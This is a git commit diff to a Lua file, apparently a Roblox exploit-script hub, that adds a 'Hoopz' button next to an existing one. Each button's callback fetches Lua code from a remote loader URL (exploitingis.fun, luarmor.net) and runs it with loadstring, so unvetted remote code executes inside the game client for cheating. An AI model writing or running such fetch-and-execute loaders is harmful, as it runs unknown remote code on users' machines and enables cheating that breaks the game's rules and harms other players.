dd902d473d2543995e4f8d8a4534daf1157cd935
bronxkid <doyouthinkiknowthisisfortwitch@gmail.com>
2025-07-30 21:53:36 -0400

    Update denvy.lua

--- denvy.lua
+++ denvy.lua
@@ -47,3 +47,10 @@ local Button = Tab:CreateButton({
        loadstring(game:HttpGet('https://api.exploitingis.fun/loader', true))()
 	end
 })
+local Button = Tab:createButton({
+	Name = "Hoopz",
+	Description = nil,
+	Callback = function()
+       loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bf15a15feb3e074f81db01496cbb48e2.lua"))()
+	end
+})	
